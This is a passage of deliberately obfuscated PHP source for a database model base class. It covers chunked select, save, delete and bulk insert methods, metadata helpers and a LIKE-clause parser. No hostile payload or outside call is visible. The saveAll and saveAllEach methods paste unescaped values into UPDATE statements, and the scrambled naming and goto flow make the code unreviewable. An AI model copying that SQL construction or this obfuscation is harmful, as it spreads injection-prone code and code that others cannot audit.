Aö¶Ä¾ÍæË; A“×ë«¦: $F„¡Õ…•˜ =& $_SERVER[òÀöí]; global $in; $fÂÅãÔ¾ö = $this->optionsValue(); goto Bó¶ãÎÒª; Bó¶ãÎÒª: $Cˆ‡îªåï÷ = 4000; $d¿ÃÆ§œ½„ = isset($in[$F„¡Õ…•˜[358]]) ? $in[$F„¡Õ…•˜[358]] : $d¿ÃÆ§œ½„; if ($d¿ÃÆ§œ½„ === -1) { unset($in[$F„¡Õ…•˜[358]]); $Cˆ‡îªåï÷ = 100000000; $d¿ÃÆ§œ½„ = $Cˆ‡îªåï÷; } goto B‡íƒ©˜; B‡íƒ©˜: $AâØ¦Û‚Éƒ = $fÂÅãÔ¾ö; $AâØ¦Û‚Éƒ[$F„¡Õ…•˜[359]] = array(); $this->optionsValue($AâØ¦Û‚Éƒ); goto DÀÛ¼§Œì; F§Œñöé¸: $this->optionsValue($fÂÅãÔ¾ö); $BÙ»ğøƒ Ö = $this->page($BÕ£Òß›Èµ, $d¿ÃÆ§œ½„)->select(); $BÙ»ğøƒ Ö = is_array($BÙ»ğøƒ Ö) ? $BÙ»ğøƒ Ö : array(); goto BåìÖÉ÷; DÀÛ¼§Œì: $cœŸì©¨ª = intval($this->count()); $d¿ÃÆ§œ½„ = intval($d¿ÃÆ§œ½„); $d¿ÃÆ§œ½„ = $d¿ÃÆ§œ½„ <= 5 ? 5 : ($d¿ÃÆ§œ½„ >= $Cˆ‡îªåï÷ ? $Cˆ‡îªåï÷ : $d¿ÃÆ§œ½„); goto CŞÉ®•ˆ™; Aö¶Ä¾ÍæË: } protected function checkLength($F®šóğÁ „, $E°‹™éÜˆÓ = 0, $Aî—Òø™Œí = '') { $F­ÂĞŠÒ =& $_SERVER[òÀöí]; $E°‹™éÜˆÓ = $E°‹™éÜˆÓ ? $E°‹™éÜˆÓ : 65536; if (!$F®šóğÁ „ || strlen($F®šóğÁ „) < $E°‹™éÜˆÓ) { return; } $Aî—Òø™Œí = $Aî—Òø™Œí ? $Aî—Òø™Œí . $F­ÂĞŠÒ[67] : $F­ÂĞŠÒ[33]; show_json($Aî—Òø™Œí . LNG($F­ÂĞŠÒ[364]) . "\x28{$E°‹™éÜˆÓ}\51", !1); } protected function metaSet($EçÄ˜Õ„ê·, $eÉÏÚ‹Íª = null, $C¬Í«ØÇ§ƒ = null) { goto A½‚‘á¿†à; cñô»ªÈ¯: $C†åÛÕ§†Ë = $this->tableMeta[$CÅ§”®•ƒ[366]]; $b»õ‚¾èù… = Model($C†åÛÕ§†Ë); $BïŠ¯¡˜Î¹ = array($e‡³¸‡²ƒ => $EçÄ˜Õ„ê·, $CÅ§”®•ƒ[367] => $eÉÏÚ‹Íª); goto bÌÕÓĞ»„ª; bÌÕÓĞ»„ª: if (is_null($eÉÏÚ‹Íª)) { return $b»õ‚¾èù…->where(array($e‡³¸‡²ƒ => $EçÄ˜Õ„ê·))->delete(); } if (is_null($C¬Í«ØÇ§ƒ) && is_string($eÉÏÚ‹Íª)) { return $b»õ‚¾èù…->where($BïŠ¯¡˜Î¹)->delete(); } $dåŞÃßÉİ· = is_array($eÉÏÚ‹Íª) ? $eÉÏÚ‹Íª : array(); goto Bƒ£¢“¡˜; A½‚‘á¿†à: $CÅ§”®•ƒ =& $_SERVER[òÀöí]; if (!$this->tableMeta || !$EçÄ˜Õ„ê·) { return !1; } $e‡³¸‡²ƒ = $this->tableMeta[$CÅ§”®•ƒ[365]]; goto cñô»ªÈ¯; Bƒ£¢“¡˜: if (is_string($eÉÏÚ‹Íª)) { $dåŞÃßÉİ·[$eÉÏÚ‹Íª] = $C¬Í«ØÇ§ƒ; } $e¿…³Ù“Ìæ = array(); foreach ($dåŞÃßÉİ· as $DİîÔæ«´§ => $c®…Àì¸´’) { $this->checkLength($c®…Àì¸´’, !1, $C†åÛÕ§†Ë . $CÅ§”®•ƒ[4] . $DİîÔæ«´§); $e¿…³Ù“Ìæ[] = array($e‡³¸‡²ƒ => $EçÄ˜Õ„ê·, $CÅ§”®•ƒ[92] => $DİîÔæ«´§, $CÅ§”®•ƒ[368] => $c®…Àì¸´’); } goto FÚ½‰¿Ÿ›Å; FÚ½‰¿Ÿ›Å: $b»õ‚¾èù…->where(array($e‡³¸‡²ƒ => $EçÄ˜Õ„ê·))->addAll($e¿…³Ù“Ìæ, array(), !0); return !0; goto b‰ñ”äØï; b‰ñ”äØï: } public function metaGet($AÎÊÌÈøÕ, $bĞ„İÄİÁË = false) { goto d¤Ğ×æ•Ôô; d¤Ğ×æ•Ôô: $Aëæ¼–Œ§Ë =& $_SERVER[òÀöí]; if (!$this->tableMeta) { return array(); } $Bã§ÍáŒõ¸ = $this->tableMeta[$Aëæ¼–Œ§Ë[365]]; goto AŠÄ˜¼ˆÙ™; AŠÄ˜¼ˆÙ™: $F–ä±ß‘ò = Model($this->tableMeta[$Aëæ¼–Œ§Ë[366]]); if ($bĞ„İÄİÁË) { $b‡¯¼º§ñ = array($Bã§ÍáŒõ¸ => $AÎÊÌÈøÕ, $Aëæ¼–Œ§Ë[92] => $bĞ„İÄİÁË); return $F–ä±ß‘ò->where($b‡¯¼º§ñ)->getField($Aëæ¼–Œ§Ë[368]); } $b‡¯¼º§ñ = array($Bã§ÍáŒõ¸ => $AÎÊÌÈøÕ); goto B—ğ™ª–Ï; B—ğ™ª–Ï: $e½Ùà‰ÓŞ = $F–ä±ß‘ò->field($Aëæ¼–Œ§Ë[369])->where($b‡¯¼º§ñ)->select(); $e½Ùà‰ÓŞ = array_to_keyvalue($e½Ùà‰ÓŞ, $Aëæ¼–Œ§Ë[92], $Aëæ¼–Œ§Ë[368]); return $e½Ùà‰ÓŞ; goto aŸêçƒĞÁ; aŸêçƒĞÁ: } private function checkDataAutoHas($EÚ‚´«µÄ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $dœÆŠ») { if (in_array($EÚ‚´«µÄ, explode($_SERVER[òÀöí][47], $dœÆŠ»[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$b¨ìÙ²×Ó, $Eõ¬œ—Ş‘) { $e—©‘Í ¨¸ =& $_SERVER[òÀöí]; foreach ($this->dataAuto as $AªÛ’Íµ÷) { $dòŒ’Â³Ùœ = $AªÛ’Íµ÷[0]; if (!in_array($Eõ¬œ—Ş‘, explode($e—©‘Í ¨¸[47], $AªÛ’Íµ÷[2]))) { continue; } switch (trim($AªÛ’Íµ÷[3])) { case $e—©‘Í ¨¸[317]: case $e—©‘Í ¨¸[318]: $Dä¡Ë†¥à˜ = $AªÛ’Íµ÷[1]; $c‚ŠËáÓ¨ = isset($AªÛ’Íµ÷[4]) ? (array) $AªÛ’Íµ÷[4] : array(); if ($Dä¡Ë†¥à˜ == $e—©‘Í ¨¸[195] && array_key_exists($dòŒ’Â³Ùœ, $b¨ìÙ²×Ó)) { if (!$b¨ìÙ²×Ó[$dòŒ’Â³Ùœ]) { unset($b¨ìÙ²×Ó[$dòŒ’Â³Ùœ]); } break; } if (isset($b¨ìÙ²×Ó[$dòŒ’Â³Ùœ])) { array_unshift($c‚ŠËáÓ¨, $b¨ìÙ²×Ó[$dòŒ’Â³Ùœ]); } if ($e—©‘Í ¨¸[317] == $AªÛ’Íµ÷[3]) { $b¨ìÙ²×Ó[$dòŒ’Â³Ùœ] = call_user_func_array($Dä¡Ë†¥à˜, $c‚ŠËáÓ¨); } else { $b¨ìÙ²×Ó[$dòŒ’Â³Ùœ] = call_user_func_array(array(&$this, $Dä¡Ë†¥à˜), $c‚ŠËáÓ¨); } break; case $e—©‘Í ¨¸[269]: $b¨ìÙ²×Ó[$dòŒ’Â³Ùœ] = $b¨ìÙ²×Ó[$AªÛ’Íµ÷[1]]; break; case $e—©‘Í ¨¸[290]: if (isset($b¨ìÙ²×Ó[$dòŒ’Â³Ùœ]) && !is_string($b¨ìÙ²×Ó[$dòŒ’Â³Ùœ])) { $b¨ìÙ²×Ó[$dòŒ’Â³Ùœ] = json_encode_force($b¨ìÙ²×Ó[$dòŒ’Â³Ùœ]); } break; case $e—©‘Í ¨¸[319]: if ($b¨ìÙ²×Ó[$dòŒ’Â³Ùœ] === $e—©‘Í ¨¸[33]) { unset($b¨ìÙ²×Ó[$dòŒ’Â³Ùœ]); } break; case $e—©‘Í ¨¸[320]: $b¨ìÙ²×Ó[$dòŒ’Â³Ùœ] = $AªÛ’Íµ÷[1]; default: break; } } if ($Eõ¬œ—Ş‘ == $e—©‘Í ¨¸[353]) { $D½İ„ù¬¶¥ = strtolower($this->db->getDbType()); if (strpos($D½İ„ù¬¶¥, $e—©‘Í ¨¸[9]) !== 0) { return; } $EŒ¦ù÷Ìª = $this->field(!0)->fields; $f…‡µ¯Âåá = $EŒ¦ù÷Ìª[$e—©‘Í ¨¸[248]]; if (isset($EŒ¦ù÷Ìª[$e—©‘Í ¨¸[247]])) { unset($f…‡µ¯Âåá[$EŒ¦ù÷Ìª[$e—©‘Í ¨¸[247]]]); } foreach ($f…‡µ¯Âåá as $aŸŞ‰ã™ªí => $Eõ¬œ—Ş‘) { if (!isset($b¨ìÙ²×Ó[$aŸŞ‰ã™ªí])) { $b¨ìÙ²×Ó[$aŸŞ‰ã™ªí] = $e—©‘Í ¨¸[33]; } } } } private function dataAfterFilter(&$Aöå–ÙÒÊø) { $d¢ÕîğĞù– =& $_SERVER[òÀöí]; foreach ($this->dataAuto as $DÓÏ«í®¨) { $D§”Ö¢×š‘ = $DÓÏ«í®¨[0]; if (!in_array($d¢ÕîğĞù–[355], explode($d¢ÕîğĞù–[47], $DÓÏ«í®¨[2]))) { continue; } if (!isset($Aöå–ÙÒÊø[$D§”Ö¢×š‘])) { continue; } switch (trim($DÓÏ«í®¨[3])) { case $d¢ÕîğĞù–[317]: case $d¢ÕîğĞù–[318]: $a˜Ÿ½¶”ï = isset($DÓÏ«í®¨[4]) ? (array) $DÓÏ«í®¨[4] : array(); array_unshift($a˜Ÿ½¶”ï, $Aöå–ÙÒÊø[$D§”Ö¢×š‘]); if ($d¢ÕîğĞù–[317] == $DÓÏ«í®¨[3]) { $Aöå–ÙÒÊø[$D§”Ö¢×š‘] = call_user_func_array($DÓÏ«í®¨[1], $a˜Ÿ½¶”ï); } else { $Aöå–ÙÒÊø[$D§”Ö¢×š‘] = call_user_func_array(array(&$this, $DÓÏ«í®¨[1]), $a˜Ÿ½¶”ï); } break; case $d¢ÕîğĞù–[269]: $Aöå–ÙÒÊø[$D§”Ö¢×š‘] = $Aöå–ÙÒÊø[$DÓÏ«í®¨[1]]; break; case $d¢ÕîğĞù–[290]: $bê›©‹æ© = $Aöå–ÙÒÊø[$D§”Ö¢×š‘]; $Aöå–ÙÒÊø[$D§”Ö¢×š‘] = json_decode($bê›©‹æ©, !0); if (is_null($Aöå–ÙÒÊø[$D§”Ö¢×š‘])) { $Aöå–ÙÒÊø[$D§”Ö¢×š‘] = $bê›©‹æ©; } break; case $d¢ÕîğĞù–[319]: if ($Aöå–ÙÒÊø[$D§”Ö¢×š‘] === $d¢ÕîğĞù–[33]) { unset($Aöå–ÙÒÊø[$D§”Ö¢×š‘]); } break; case $d¢ÕîğĞù–[320]: $Aöå–ÙÒÊø[$D§”Ö¢×š‘] = $DÓÏ«í®¨[1]; default: break; } } } public function saveAll($b¡º‚°Ó¿¿) { goto Dë——ä â; fï–ôƒĞ§: $this->chunkEventSet(); goto f“÷çò´; A¶´Ø½©æù: $cñ„ˆó¸Ï = array(); $Eö§¼ ØÛ = count($b¡º‚°Ó¿¿); for ($E‚ò¿…Ä¸‚ = 0; $E‚ò¿…Ä¸‚ < $Eö§¼ ØÛ; $E‚ò¿…Ä¸‚++) { $a‡®Òˆ¯©Œ = $b¡º‚°Ó¿¿[$E‚ò¿…Ä¸‚]; if (!is_array($a‡®Òˆ¯©Œ) || count($a‡®Òˆ¯©Œ) != 4) { continue; } $FõÄŒÌ·Âó = "\125\120\x44\x41\x54\x45\x20\140{$bğíï‡—Ñ§}\x60\x20\x53\105\x54\x20{$a‡®Òˆ¯©Œ[2]}\x20\x3d\40\103\x41\x53\x45\x20{$a‡®Òˆ¯©Œ[0]}\x20\xa"; if ($CÒšÁ¢ù÷› == 0) { $f¯œÊ„´ŸŸ = $FõÄŒÌ·Âó; } $cñ„ˆó¸Ï[] = $b‰¡ÒëëÄŞ[115] . $a‡®Òˆ¯©Œ[1] . $b‰¡ÒëëÄŞ[115]; $CÒšÁ¢ù÷›++; $f¯œÊ„´ŸŸ .= "\x20\127\x48\105\x4e\x20\47{$a‡®Òˆ¯©Œ[1]}\47\x20\x54\110\x45\116\x20\47{$a‡®Òˆ¯©Œ[3]}\47\40\12"; if ($CÒšÁ¢ù÷› == $dŠïÜï²èá || $E‚ò¿…Ä¸‚ == $Eö§¼ ØÛ - 1) { goto AÌÕÇŸƒ¢‘; fù„ì–¹æ…: $CÒšÁ¢ù÷› = 0; $f¯œÊ„´ŸŸ = $FõÄŒÌ·Âó; $this->chunkEventCheck(count($cñ„ˆó¸Ï)); goto BìÙ°ùÇâ´; BìÙ°ùÇâ´: $cñ„ˆó¸Ï = array(); goto f…´µŠá°‚; AÌÕÇŸƒ¢‘: $AòÒ”ÀÕË = implode($b‰¡ÒëëÄŞ[47], $cñ„ˆó¸Ï); $f¯œÊ„´ŸŸ .= "\x20\105\x4e\x44\x20\x20\x57\110\105\122\x45\40{$a‡®Òˆ¯©Œ[0]}\40\111\x4e\x20\x28{$AòÒ”ÀÕË}\51\40"; $this->execute($f¯œÊ„´ŸŸ); goto fù„ì–¹æ…; f…´µŠá°‚: } } goto fï–ôƒĞ§; c®´Â¨ã›º: $b¡º‚°Ó¿¿ = is_array($b¡º‚°Ó¿¿) ? $b¡º‚°Ó¿¿ : array(); $f¯œÊ„´ŸŸ = $b‰¡ÒëëÄŞ[370]; $CÒšÁ¢ù÷› = 0; goto A¶´Ø½©æù; Dë——ä â: $b‰¡ÒëëÄŞ =& $_SERVER[òÀöí]; $bğíï‡—Ñ§ = $this->tablePrefix . $this->tableName; $dŠïÜï²èá = self::SQL_WHERE_IN_CHUNK; goto c®´Â¨ã›º; f“÷çò´: } public function saveAllEach($C·ÙÌóÊª) { $F´‘çªÉö =& $_SERVER[òÀöí]; $EĞöÁ¹Ï• = $this->tablePrefix . $this->tableName; foreach ($C·ÙÌóÊª as $BÕß—Ù±ƒ­) { if (!is_array($BÕß—Ù±ƒ­) || count($BÕß—Ù±ƒ­) != 4) { continue; } $FëÀè¨¶ôÌ = $BÕß—Ù±ƒ­[0] . $F´‘çªÉö[371] . $BÕß—Ù±ƒ­[1] . $F´‘çªÉö[115]; $f¯Ä‘…­íˆ = $BÕß—Ù±ƒ­[2] . $F´‘çªÉö[371] . $BÕß—Ù±ƒ­[3] . $F´‘çªÉö[115]; $DÒ”Ä±†£ = "\x75\160\144\x61\x74\x65\40{$EĞöÁ¹Ï•}\x20\x73\x65\164\40{$f¯Ä‘…­íˆ}\x20\167\150\145\162\x65\40{$FëÀè¨¶ôÌ}\73"; $this->execute($DÒ”Ä±†£); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($DÔçÒİÉ = false, $Aöø¨·¢‚ = false) { $this->_chunkEvent = $DÔçÒİÉ; $this->_chunkEventParam = $Aöø¨·¢‚; } private function chunkEventCheck($Døï…«¤‚) { if (!$this->_chunkEvent) { return; } $F™§ßæ…¼É = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $F™§ßæ…¼É[$_SERVER[òÀöí][372]] = $Døï…«¤‚; Hook::trigger($this->_chunkEvent, $F™§ßæ…¼É); } public function addAll($aêòƒ†­Ò‚, $dÕ¬Ç³Æ«Œ = array(), $C³ëÁñ»‘ì = false) { goto C‹Ñ…ìâ ‘; C‹Ñ…ìâ ‘: $b»ô¹šŠîø =& $_SERVER[òÀöí]; ignore_timeout(); $d»Üâ¸‹«Š = self::SQL_WHERE_IN_CHUNK; goto AæÊ“¿×; AæÊ“¿×: if (empty($aêòƒ†­Ò‚)) { $this->error = think_lang($b»ô¹šŠîø[267]); return !1; } $dÕ¬Ç³Æ«Œ = $this->_parseOptions($dÕ¬Ç³Æ«Œ); foreach ($aêòƒ†­Ò‚ as $dí§ÎéÜö© => $cñÍ³ÓÓÅ) { $aêòƒ†­Ò‚[$dí§ÎéÜö©] = $this->_facade($cñÍ³ÓÓÅ); $this->_beforeInsert($aêòƒ†­Ò‚[$dí§ÎéÜö©], $dÕ¬Ç³Æ«Œ); } goto A™‘‡ˆ¤†; A™‘‡ˆ¤†: if (method_exists($this->db, $b»ô¹šŠîø[268])) { for ($Dµ„¯îçˆ = 0; $Dµ„¯îçˆ < count($aêòƒ†­Ò‚); $Dµ„¯îçˆ += $d»Üâ¸‹«Š) { $f²‰²ğ½± = array_slice($aêòƒ†­Ò‚, $Dµ„¯îçˆ, $d»Üâ¸‹«Š); if (!is_array($f²‰²ğ½±) || count($f²‰²ğ½±) == 0) { break; } $A÷Ù÷ÊÓ§ = $this->db->insertAll($f²‰²ğ½±, $dÕ¬Ç³Æ«Œ, $C³ëÁñ»‘ì); $this->chunkEventCheck(count($f²‰²ğ½±)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($aêòƒ†­Ò‚ as $dí§ÎéÜö© => $cñÍ³ÓÓÅ) { $A÷Ù÷ÊÓ§ = $this->db->insert($cñÍ³ÓÓÅ, $dÕ¬Ç³Æ«Œ, $C³ëÁñ»‘ì); } $this->commit(); } if (!1 !== $A÷Ù÷ÊÓ§) { $D½¾ö¼©Ã = $this->getLastInsID(); if ($D½¾ö¼©Ã) { return $D½¾ö¼©Ã; } } return $A÷Ù÷ÊÓ§; goto B‚¨˜Öéê‘; B‚¨˜Öéê‘: } public function save($aÒĞÙ‹İ‚ = '', $e¯³ö¹àì = array()) { goto Cæö‚¿Ô–³; Cæö‚¿Ô–³: $dÛ•†©áØ“ =& $_SERVER[òÀöí]; $c®àÛàÔ× = self::SQL_WHERE_IN_CHUNK; $bœÄƒ‰À¹² = $this->optionsValue(); goto D‡šÜ›“„; D³‡˜×ê²±: for ($CºÜ”Â“‘Æ = 0; $CºÜ”Â“‘Æ < $F´¹È·™ù¦; $CºÜ”Â“‘Æ += $c®àÛàÔ×) { $AÙÍçœ£Í = array_slice($d¶½¶Û¶‡, $CºÜ”Â“‘Æ, $c®àÛàÔ×); if (!is_array($AÙÍçœ£Í) || count($AÙÍçœ£Í) == 0) { break; } $bœÄƒ‰À¹²[$dÛ•†©áØ“[271]][$eéÏ‹Ğ¤š][1] = $AÙÍçœ£Í; $this->optionsValue($bœÄƒ‰À¹²); $dÔ‚ÆîÂ×è += parent::save($aÒĞÙ‹İ‚, $e¯³ö¹àì); $this->chunkEventCheck(count($AÙÍçœ£Í)); } $this->chunkEventSet(); return $dÔ‚ÆîÂ×è; goto C÷Æ†¥õê×; D‡šÜ›“„: $eéÏ‹Ğ¤š = $this->findWhereField($bœÄƒ‰À¹²); if (!$eéÏ‹Ğ¤š) { return parent::save($aÒĞÙ‹İ‚, $e¯³ö¹àì); } $dÔ‚ÆîÂ×è = 0; goto bÉôÑÍÖšù; bÉôÑÍÖšù: $d¶½¶Û¶‡ = $bœÄƒ‰À¹²[$dÛ•†©áØ“[271]][$eéÏ‹Ğ¤š][1]; $d¶½¶Û¶‡ = is_array($d¶½¶Û¶‡) ? $d¶½¶Û¶‡ : array(); $F´¹È·™ù¦ = count($d¶½¶Û¶‡); goto D³‡˜×ê²±; C÷Æ†¥õê×: } public function add($B‹ŒêˆÏÏ… = '', $aè™˜àì = array(), $bá¿Ö‘ø­ = false) { if ($this->addTaskStatus && is_array($B‹ŒêˆÏÏ…)) { $this->addTaskData[] = $B‹ŒêˆÏÏ…; return; } return parent::add($B‹ŒêˆÏÏ…, $aè™˜àì, $bá¿Ö‘ø­); } public function parseWhereLike($e±ŸŠ¥ë¯², $fÔõÇ ™³ = '', $F¡ªñ“™šñ = false, &$båƒ¾âÑİ = false) { goto Eéµö Ãê; f„İ‹‡²ˆƒ: if (!is_array($e±ŸŠ¥ë¯²)) { return $e±ŸŠ¥ë¯²; } $AêÔœ‚Œ = array(); $Fì¼‘óˆÎÌ = 0; goto C¡¸£Ûóù²; C¡¸£Ûóù²: foreach ($e±ŸŠ¥ë¯² as $Aà×‘ˆ¾ø => $cŒÍ‘·Í‹ù) { if (is_array($cŒÍ‘·Í‹ù) && count($cŒÍ‘·Í‹ù) == 2 && $cŒÍ‘·Í‹ù[0] == $böù®²¢£[375] && is_string($cŒÍ‘·Í‹ù[1]) && substr($cŒÍ‘·Í‹ù[1], 0, 1) == $böù®²¢£[376] && substr($cŒÍ‘·Í‹ù[1], strlen($cŒÍ‘·Í‹ù[1]) - 1, 1) == $böù®²¢£[376]) { goto fï„‘¿ëˆÅ; d‚¶ùÃ³Øø: $AêÔœ‚Œ[$Fì¼‘óˆÎÌ] = $böù®²¢£[379] . $A»™öåØÍ° . $böù®²¢£[380] . $d¾Ø¡´æÖŒ . $böù®²¢£[381]; $Fì¼‘óˆÎÌ++; continue; goto Eá¸ò¾ÈÖš; BáÍÀ’­ª—: $d¾Ø¡´æÖŒ = $this->db->escapeString($d¾Ø¡´æÖŒ); if (!strpos($A»™öåØÍ°, $böù®²¢£[94])) { $A»™öåØÍ° = $böù®²¢£[377] . $A»™öåØÍ° . $böù®²¢£[377]; } if ($Eİí¯Åã«á[$böù®²¢£[378]]) { $d¾Ø¡´æÖŒ = $böù®²¢£[115] . $d¾Ø¡´æÖŒ . $böù®²¢£[115]; } goto d‚¶ùÃ³Øø; fï„‘¿ëˆÅ: $båƒ¾âÑİ = !0; $A»™öåØÍ° = is_string($Aà×‘ˆ¾ø) ? $Aà×‘ˆ¾ø : $fÔõÇ ™³; $d¾Ø¡´æÖŒ = substr($cŒÍ‘·Í‹ù[1], 1, strlen($cŒÍ‘·Í‹ù[1]) - 2); goto BáÍÀ’­ª—; Eá¸ò¾ÈÖš: } if (is_array($cŒÍ‘·Í‹ù)) { $fÔõÇ ™³ = is_string($Aà×‘ˆ¾ø) ? $Aà×‘ˆ¾ø : $fÔõÇ ™³; $cŒÍ‘·Í‹ù = $this->parseWhereLike($cŒÍ‘·Í‹ù, $fÔõÇ ™³, !0, $båƒ¾âÑİ); } if (is_numeric($Aà×‘ˆ¾ø)) { $AêÔœ‚Œ[$Fì¼‘óˆÎÌ] = $cŒÍ‘·Í‹ù; $Fì¼‘óˆÎÌ++; } else { $AêÔœ‚Œ[$Aà×‘ˆ¾ø] = $cŒÍ‘·Í‹ù; } } if ($båƒ¾âÑİ && !$F¡ªñ“™šñ) { trace_log(array($AêÔœ‚Œ, $e±ŸŠ¥ë¯²), $böù®²¢£[271]); } return $AêÔœ‚Œ; goto AŠùªÛ¤Í¡; Eéµö Ãê: $böù®²¢£ =& $_SERVER[òÀöí]; $Eİí¯Åã«á = $GLOBALS[$böù®²¢£[6]][$böù®²¢£[373]]; if (!$Eİí¯Åã«á[$böù®²¢£[374]]) { return $e±ŸŠ¥ë¯²; } goto f„İ‹‡²ˆƒ; AŠùªÛ¤Í¡: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($e¹¥›ÖÀŒ = array()) { goto F†ä³ãœŞß; F†ä³ãœŞß: $aì£óÀÍå =& $_SERVER[òÀöí]; $c¤‡°’Ì± = self::SQL_WHERE_IN_CHUNK; $aé¨Ü”íÔ = $this->optionsValue(); goto e‡‰œ°íŠ; e‡‰œ°íŠ: $aáŠ­÷‹‚† = $this->findWhereField($aé¨Ü”íÔ); if (!$aáŠ­÷‹‚† || isset($aé¨Ü”íÔ[$aì£óÀÍå[288]]) || isset($aé¨Ü”íÔ[$aì£óÀÍå[349]])) { return parent::select($e¹¥›ÖÀŒ); } $f˜¶ŠªàÔ™ = $aé¨Ü”íÔ[$aì£óÀÍå[271]][$aáŠ­÷‹‚†][1]; goto E ÁÜÙ×; E ÁÜÙ×: $f˜¶ŠªàÔ™ = is_array($f˜¶ŠªàÔ™) ? $f˜¶ŠªàÔ™ : array(); $dÙóè†Ğ‡ = null; for ($C¶…Û–ƒèà = 0; $C¶…Û–ƒèà < count($f˜¶ŠªàÔ™); $C¶…Û–ƒèà += $c¤‡°’Ì±) { $cá…Ç˜¦ÃÎ = array_slice($f˜¶ŠªàÔ™, $C¶…Û–ƒèà, $c¤‡°’Ì±); if (!is_array($cá…Ç˜¦ÃÎ) || count($cá…Ç˜¦ÃÎ) == 0) { break; } $aé¨Ü”íÔ[$aì£óÀÍå[271]][$aáŠ­÷‹‚†][1] = $cá…Ç˜¦ÃÎ; $this->optionsValue($aé¨Ü”íÔ); $A›ò¿¸î = parent::select($e¹¥›ÖÀŒ); if (!$A›ò¿¸î) { continue; } if (is_null($dÙóè†Ğ‡)) { $dÙóè†Ğ‡ = array(); } $dÙóè†Ğ‡ = array_merge($dÙóè†Ğ‡, $A›ò¿¸î); } goto A›Ì„²ë¿½; A›Ì„²ë¿½: return $dÙóè†Ğ‡; goto f“—² ‰Ä‘; f“—² ‰Ä‘: } public function delete($C™±åö ¤¦ = array()) { goto e—†½ÔïÁ„; Bø³§Ùğ•Ÿ: $c„§’ˆó = $DäÁ†Šó·‹[$B¢ß¶ÎÂì¶[271]][$E†¥ÒŞç‡][1]; $c„§’ˆó = is_array($c„§’ˆó) ? $c„§’ˆó : array(); for ($B›¨ÛÉäÒí = 0; $B›¨ÛÉäÒí < count($c„§’ˆó); $B›¨ÛÉäÒí += $eôˆâÌùˆ) { $A¬¡èŠØ® = array_slice($c„§’ˆó, $B›¨ÛÉäÒí, $eôˆâÌùˆ); if (!is_array($A¬¡èŠØ®) || count($A¬¡èŠØ®) == 0) { break; } $DäÁ†Šó·‹[$B¢ß¶ÎÂì¶[271]][$E†¥ÒŞç‡][1] = $A¬¡èŠØ®; $this->optionsValue($DäÁ†Šó·‹); $FŸˆÏ‡Ä† += parent::delete($C™±åö ¤¦); } goto CîÒÉÀç¥§; e—†½ÔïÁ„: $B¢ß¶ÎÂì¶ =& $_SERVER[òÀöí]; $eôˆâÌùˆ = self::SQL_WHERE_IN_CHUNK; $DäÁ†Šó·‹ = $this->optionsValue(); goto Cœ¹¥îáÙ–; Cœ¹¥îáÙ–: $E†¥ÒŞç‡ = $this->findWhereField($DäÁ†Šó·‹); if (!$E†¥ÒŞç‡) { return parent::delete($C™±åö ¤¦); } $FŸˆÏ‡Ä† = 0; goto Bø³§Ùğ•Ÿ; CîÒÉÀç¥§: return $FŸˆÏ‡Ä†; goto CÏ»¨‡âõ; CÏ»¨‡âõ: } private function findWhereField($DÇ–‘¶ô‚’) { $AêÜ”‹’ =& $_SERVER[òÀöí]; $cÕ¿ÄÈ¢×– = self::SQL_WHERE_IN_CHUNK; if (!is_array($DÇ–‘¶ô‚’) || !is_array($DÇ–‘¶ô‚’[$AêÜ”‹’[271]])) { return !1; } foreach ($DÇ–‘¶ô‚’[$AêÜ”‹’[271]] as $D¶Ü‚ËíÄ => $Bö§çéÔ¬É) { if (is_array($Bö§çéÔ¬É) && isset($Bö§çéÔ¬É[0]) && is_string($Bö§çéÔ¬É[0]) && strtolower($Bö§çéÔ¬É[0]) == $AêÜ”‹’[7] && is_array($Bö§çéÔ¬É[1]) && count($Bö§çéÔ¬É[1]) > $cÕ¿ÄÈ¢×–) { ignore_timeout(); return $D¶Ü‚ËíÄ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\x65\x6d\x4f\x70\164\151\157\156"; public $field = array(); public function listData($E•ëâÒÂ˜ = false, $b”ˆ˜íŞ· = "\x6d\x6f\144\x69\x66\x79\x54\151\x6d\x65", $cØ¬ôİ˜Äº = false) { $AÇšÂÙæŠ¥ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$AÇšÂÙæŠ¥) { return $E•ëâÒÂ˜ ? null : array(); } if (!$E•ëâÒÂ˜) { $AÇšÂÙæŠ¥ = array_filter(array_values($AÇšÂÙæŠ¥)); return array_sort_by($AÇšÂÙæŠ¥, $b”ˆ˜íŞ·, $cØ¬ôİ˜Äº); } return $AÇšÂÙæŠ¥[$_SERVER[òÀöí][382] . $E•ëâÒÂ˜]; } public function insert($FãÁğ„åÛ‘) { goto d‘Õë¼ò¢; E†ê´ˆ Ñë: $FãÁğ„åÛ‘[$DÙÜŸ‰ó¼[83]] = time(); Model($this->modelType)->set($DÙÜŸ‰ó¼[383], $Bæµ†ˆ¦—¦, $this->optionType . $DÙÜŸ‰ó¼[384]); Model($this->modelType)->set($DÙÜŸ‰ó¼[382] . $Bæµ†ˆ¦—¦, $FãÁğ„åÛ‘, $this->optionType); goto E›ó“Á¤Ôå; E›ó“Á¤Ôå: return $Bæµ†ˆ¦—¦; goto BíÎ«º‰í¬; d‘Õë¼ò¢: $DÙÜŸ‰ó¼ =& $_SERVER[òÀöí]; $FãÁğ„åÛ‘ = array_field_key($FãÁğ„åÛ‘, $this->field); $Bæµ†ˆ¦—¦ = Model($this->modelType)->get($DÙÜŸ‰ó¼[383], $this->optionType . $DÙÜŸ‰ó¼[384]); goto a¼²¿ŒƒÍ³; a¼²¿ŒƒÍ³: $Bæµ†ˆ¦—¦ = $Bæµ†ˆ¦—¦ ? $Bæµ†ˆ¦—¦ : 0; $FãÁğ„åÛ‘[$DÙÜŸ‰ó¼[385]] = ++$Bæµ†ˆ¦—¦; $FãÁğ„åÛ‘[$DÙÜŸ‰ó¼[192]] = time(); goto E†ê´ˆ Ñë; BíÎ«º‰í¬: } public function update($aĞ¯Ìñ©Ë, 